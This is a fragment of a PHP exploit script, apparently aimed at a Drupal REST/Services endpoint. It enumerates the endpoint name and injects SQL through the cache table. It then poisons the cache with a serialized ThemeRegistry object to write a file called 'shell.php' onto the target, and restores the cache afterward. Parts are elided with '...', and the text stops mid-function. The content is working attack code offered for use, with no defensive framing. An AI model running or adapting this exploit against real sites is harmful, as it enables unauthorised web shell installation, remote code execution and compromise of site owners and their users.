...
# 3. Restore the cache
# Initialization
x("You can use:\n\t{$argv[0]} <url> <api-path> <endpoint-name>");
x("Example:");
x("\t{$argv[0]} http://drupal.pes /rest endpoint\n");
error_reporting(0);
define('QID', 'anything');
...
if(isset($argv[2])) {
    $endpoint_path = $argv[2];
}
if(isset($argv[3])) {
    $endpoint = $argv[3];
} else {
    # Try endpoint name enumeration
    $response = file_get_contents($url . $endpoint_path);
    preg_match('/"(.+)"/', $response, $tmp);
    if(isset($tmp[1])) {
        $endpoint = $tmp[1];
    } else {
        x("Can't enumerate endpoint name, Use default name 'endpoint'.");
    }
}
$file = [
    'filename' => 'shell.php',
...
$query = 
    ...
    "ux.mail AS mail, ux.theme AS theme, ($sql_cache) AS signature, " . # service endpoint get
//  "ux.mail AS mail, ux.theme AS theme, (SELECT cid FROM {cache} WHERE cid LIKE 'service:%') AS signature, " . # If cannot enumerate endpoint name, try to find it manually. See signature.
...
# Write the file
pprint('write file', json_encode($file));
storestr("write", json_encode($file));
...
function cache_poison($endpoint, $cache)
{
    ...
    cache_edit($tr, 'cache_poison');
}
function cache_reset($endpoint, $cache)
{
    $tr = new ThemeRegistry($cache, $endpoint, null, null);
    cache_edit($tr, 'restore_behaviour');
}
function cache_edit($tr, $type)
{
    global $browser;
    $data = serialize([$tr]);
    # pprint($type, $data);
...
function pretty($d)
{
    return str_replace("\0", "%00", $d);
}
function pprint($type, $data) {
    x("Stage '{$type}' sending:");
    print_r(pretty($data));
    print("\n");
}
function storestr($name, $data)
{
    $filename = "$name.post";
